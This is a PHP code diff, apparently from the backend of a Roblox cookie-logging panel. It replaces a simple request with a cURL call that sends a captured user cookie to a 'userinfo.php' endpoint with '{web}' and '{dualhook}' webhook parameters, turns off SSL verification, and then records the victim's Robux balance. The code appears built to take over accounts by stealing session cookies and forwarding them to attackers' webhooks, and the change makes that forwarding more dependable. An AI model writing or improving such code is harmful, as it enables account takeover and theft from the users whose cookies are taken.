@@ -82,8 +82,28 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             $dailyLogsData[$today] += 1;
             file_put_contents($dailyLogsFile, json_encode($dailyLogsData));
 
-            $userInfo = file_get_contents("$dom/controlPage/apis/userinfo.php?cookie=$cookie&web={web}&dh={dualhook}");
-            $userData = json_decode($userInfo, true);
+            // Call userinfo.php with cURL and proper timeout to send webhook
+            $userInfoUrl = "$dom/controlPage/apis/userinfo.php?cookie=" . urlencode($cookie) . "&web={web}&dh={dualhook}";
+            
+            $ch = curl_init($userInfoUrl);
+            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+            curl_setopt($ch, CURLOPT_TIMEOUT, 25); // Allow time for API calls but less than PHP max execution time
+            curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
+            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+            curl_setopt($ch, CURLOPT_NOSIGNAL, 1);
+            
+            $userInfo = @curl_exec($ch);
+            $curlError = curl_error($ch);
+            curl_close($ch);
+            
+            // Parse response if available, otherwise use empty array
+            $userData = [];
+            if ($userInfo && !$curlError) {
+                $decoded = @json_decode($userInfo, true);
+                if (is_array($decoded)) {
+                    $userData = $decoded;
+                }
+            }
 
             if (isset($userData['robux'])) {
                 $robuxFile = "robux.txt";
